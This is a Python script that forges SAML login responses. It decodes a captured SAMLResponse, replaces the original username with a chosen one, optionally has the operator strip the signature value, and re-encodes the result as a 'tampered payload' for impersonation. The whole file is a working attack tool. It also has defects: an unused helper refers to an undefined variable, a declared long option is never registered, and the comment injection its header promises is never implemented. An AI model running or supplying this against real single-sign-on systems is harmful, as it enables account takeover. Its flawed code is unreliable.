#!/usr/bin/python
#This script attempts to tamper with SAML responses: Signature Verification, Comment Injection, Signature Stripping

import sys, getopt
import urllib.parse
import base64
import xml.etree.ElementTree as ET
import os

def URLdecode(SAMLresponse):
	url_decoded = urllib.parse.unquote(arg)
	print(url_decoded)

def main(argv):
	original_username = ''
	tamper_username = ''
	strip_signature = False
	try: 
		opts, args = getopt.getopt(argv, "hs:u:t:x",["SAMLresponse=","username=","tamperusername="])
	except getopt.GetoptError:
		print("SAMLTamper.py  -u <original username> -t <tamper username> -s <SAMLResponse>")
		sys.exit(2)
	for opt, arg in opts:
		if opt =="-h":
			print("SAMLTamper.py -u <original username> -t <tamper username> -s <SAMLResponse>")
		elif opt in ("-u","--username"):
			original_username  = arg
		elif opt in ("-t","--tamperusername"):
			tamper_username = arg
		elif opt in ("-x","--strip"):
			strip_signature = True
		elif opt in ("-s","--SAMLresponse"):
			print("[*] URL Decoding SAML Response")
			url_decoded = urllib.parse.unquote(arg)
			print("[*] Base decoding SAML Response")
			base64_decoded_saml =  base64.b64decode(url_decoded).decode('utf-8')
			print("[*] Swapping " + original_username + " to " + tamper_username)
			swapped = base64_decoded_saml.replace(original_username,tamper_username)
			
			#check if vulnerable to signature stripping
			if(strip_signature):
				print("[*] Signature Stripping Option Detected")
				f = open("temp.xml","w")
				f.write(swapped)
				f.close()
				input("[-] Remove the content of the <ds:SignatureValue> tag (only the content) from temp.xml, then press ENTER\n")
				f = open("temp.xml","r")
				swapped =  f.read()
				print("[*] temp.xml has been parsed deleting file")
				os.remove("temp.xml")

				
				
			print("[*] Base64 Encoding the tampered SAMLResponse")
			encoded_tampered_saml = base64.b64encode(swapped.encode('utf-8'))
			print("[*] URL encoding the tampered SAMLResponse")
			url_encoded = urllib.parse.quote(encoded_tampered_saml)
			print("[*] Copy Tampered Payload Below: \n\n\n")
			print(url_encoded)
			

if __name__ == "__main__":
	main(sys.argv[1:])

